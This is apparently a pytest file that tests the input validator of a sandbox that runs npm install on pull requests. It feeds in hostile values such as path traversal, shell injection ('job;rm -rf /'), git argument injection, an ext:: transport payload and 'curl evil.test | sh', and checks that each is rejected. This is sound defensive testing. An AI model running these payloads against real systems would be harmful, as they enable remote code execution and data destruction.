"""`chamber.detonate.validate` - the Chamber's input boundary, probed adversarially.

Everything the Brain forwards here is ultimately PR-derived, and three of these fields are
interpolated straight into things that matter:

- `job_id` becomes a **filesystem path** (`jobs_dir / job_id`) and a Docker container name;
- `clone_url` becomes an argument to `git clone`;
- `head_sha` becomes an argument to `git checkout`.

`run()` calls `validate` before any of that happens, so these regexes are the only thing
standing between a malformed request and the host. They had no tests.

Note on severity: the Chamber only accepts HMAC-signed requests (`shared/signing.py`), so the
Brain is the only party who can set these fields and a PR author cannot reach them directly.
That makes this boundary defence-in-depth rather than the last line - which is exactly why it
should be tested rather than trusted.
"""

import pytest

from chamber.detonate import MAX_TIMEOUT_S, InvalidRequest, validate
from shared.contract import DetonateRequest

GOOD_SHA = "0123456789abcdef0123456789abcdef01234567"


def req(**over) -> DetonateRequest:
    base = dict(
        job_id="job-1", clone_url="https://github.com/demo-org/demo-repo.git",
        head_sha=GOOD_SHA,
    )  # fmt: skip
    return DetonateRequest(**{**base, **over})


def test_a_well_formed_request_is_accepted():
    validate(req())  # must not raise


# --- job_id: becomes a path under jobs_dir and a container name ---------------------------


@pytest.mark.parametrize(
    "job_id",
    [
        "../../etc/passwd",  # path traversal out of jobs_dir
        "..",
        "a/b",  # subdirectory
        "a\\b",  # Windows-style separator
        "job 1",  # space: splits a shell word if anything ever interpolates it
        "job;rm -rf /",
        "job$(id)",
        "-rf",  # leading dash; see the note below on why this was tightened
        "",  # empty: jobs_dir itself
        "job.1",  # dots are not allowed, so traversal is impossible by construction
        "a" * 65,  # over the length cap
        "job\n1",  # newline: log injection / arg splitting
        "job\x00",
    ],
)
def test_a_dangerous_job_id_is_rejected(job_id):
    with pytest.raises(InvalidRequest, match="job_id"):
        validate(req(job_id=job_id))


def test_the_longest_allowed_job_id_is_still_accepted():
    validate(req(job_id="a" * 64))


def test_a_job_id_may_not_start_with_a_hyphen():
    """Found by this file. `JOB_ID_RE` used to be `[A-Za-z0-9-]{1,64}`, so `-rf` validated.

    It was **not exploitable**: `job_id` only ever reaches a `Path` join (where a hyphen is an
    ordinary directory name) and a container name that is always prefixed `det-`, so it can
    never be parsed as a CLI flag. Tightened anyway because real job ids are uuid4, which
    always start with a hex digit, so requiring an alphanumeric first character rejects nothing
    legitimate. Recorded as hardening, not as a fixed vulnerability.

    Takes effect on the Chamber only after a redeploy; harmless to defer, since it is a no-op
    for every request the Brain actually sends."""
    with pytest.raises(InvalidRequest, match="job_id"):
        validate(req(job_id="-rf"))
    validate(req(job_id="0f8e2c14-dead-4beef-8000-000000000000"))  # uuid4 shape still fine


# --- head_sha: becomes a git checkout argument --------------------------------------------


@pytest.mark.parametrize(
    "sha",
    [
        "0123456",  # abbreviated: git would accept it, we must not
        GOOD_SHA.upper(),  # GitHub sends lowercase; anything else is not from GitHub
        GOOD_SHA + "a",
        "main",  # a ref, not a commit: resolves to whatever HEAD is now
        "HEAD",
        "--upload-pack=touch /tmp/x",  # argument injection into git
        f"{GOOD_SHA} --help",
        "",
    ],
)
def test_a_non_sha_head_is_rejected(sha):
    with pytest.raises(InvalidRequest, match="head_sha"):
        validate(req(head_sha=sha))


# --- clone_url: becomes a git clone argument ----------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "http://github.com/o/r",  # plaintext
        "https://gitlab.com/o/r",  # wrong host
        "https://github.com.evil.test/o/r",  # suffix confusion
        "https://evil.test/github.com/o/r",
        "https://user:pw@github.com/o/r",  # credentials in the URL
        "git@github.com:o/r.git",  # ssh
        "file:///etc/passwd",
        "https://github.com/o",  # no repo segment
        "https://github.com/o/r/extra",
        "https://github.com/o/r?x=1",
        "https://github.com/o/r#frag",
        "--upload-pack=touch /tmp/x",  # argument injection into git
        "ext::sh -c 'touch /tmp/x'",  # git's ext:: transport, a real RCE vector
        "",
    ],
)
def test_a_clone_url_that_is_not_a_github_https_repo_is_rejected(url):
    with pytest.raises(InvalidRequest, match="clone_url"):
        validate(req(clone_url=url))


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/demo-org/demo-repo",
        "https://github.com/demo-org/demo-repo.git",
        "https://github.com/a/b",
        "https://github.com/some.org/some.repo",  # dots are legal in GitHub names
    ],
)
def test_legitimate_github_urls_are_accepted(url):
    validate(req(clone_url=url))


# --- command: an allowlist on the head only -----------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        ["sh", "-c", "curl evil.test | sh"],
        ["npm"],  # too short to match a head
        ["npm", "run", "build"],
        ["npx", "install"],
        ["yarn", "install"],
        [],
        ["NPM", "INSTALL"],
    ],
)
def test_a_command_that_is_not_an_npm_install_is_rejected(command):
    with pytest.raises(InvalidRequest, match="command"):
        validate(req(command=command))


def test_the_default_command_passes_validation():
    """The contract's default must satisfy the Chamber's own allowlist - otherwise every
    request built from the defaults is rejected."""
    validate(req())
    assert DetonateRequest.model_fields["command"].default[:2] == ["npm", "install"]


def test_only_the_head_of_the_command_is_checked_which_is_a_real_gap():
    """Documented, not endorsed. `validate` checks the *prefix*, so extra npm flags pass -
    including `--ignore-scripts`, which would make the detonation prove nothing because
    install hooks are the entire thing we are watching for.

    This is safe today only because the Chamber accepts HMAC-signed requests and the Brain
    builds the command itself; a PR author cannot reach this field. If the Chamber ever takes
    a request from anywhere else, this check needs to be an exact-match allowlist."""
    validate(req(command=["npm", "install", "--ignore-scripts"]))
    validate(req(command=["npm", "install", "--prefix", "/etc"]))


# --- timeout ------------------------------------------------------------------------------


@pytest.mark.parametrize("timeout", [0, -1, MAX_TIMEOUT_S + 1, 10_000])
def test_an_out_of_range_timeout_is_rejected(timeout):
    with pytest.raises(InvalidRequest, match="timeout_s"):
        validate(req(timeout_s=timeout))


@pytest.mark.parametrize("timeout", [1, 180, MAX_TIMEOUT_S])
def test_an_in_range_timeout_is_accepted(timeout):
    validate(req(timeout_s=timeout))


def test_the_brains_default_timeout_is_within_the_chambers_limit():
    """A Brain default above MAX_TIMEOUT_S would fail every detonation at the boundary."""
    from brain.policy import DEFAULT_TIMEOUT_S

    assert 1 <= DEFAULT_TIMEOUT_S <= MAX_TIMEOUT_S
